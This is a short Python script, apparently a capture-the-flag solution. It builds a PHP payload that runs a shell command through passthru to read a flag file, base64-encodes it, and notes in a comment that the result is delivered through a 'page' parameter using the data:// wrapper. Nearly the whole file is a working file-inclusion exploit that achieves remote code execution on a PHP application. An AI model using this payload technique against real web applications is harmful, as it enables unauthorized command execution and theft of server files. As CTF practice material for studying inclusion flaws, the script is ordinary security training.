import base64
a = '3b8a24fe229f7f62e53e1060dca89c6a133f728aa4031f630cb3e59c466d2cb1'
b = '3a0436148fef1ad7e3bafaa0259fa99833961abbdc3aaf3e371cc699c1b6314d'
c = 'f14ggggggggggg'


p = "<?php echo passthru('cat ./3b8a24fe229f7f62e53e1060dca89c6a133f728aa4031f630cb3e59c466d2cb1/3a0436148fef1ad7e3bafaa0259fa99833961abbdc3aaf3e371cc699c1b6314d/f14ggggggggggg');?>"

print base64.b64encode(p)


#?page=data://text/plain;base64,
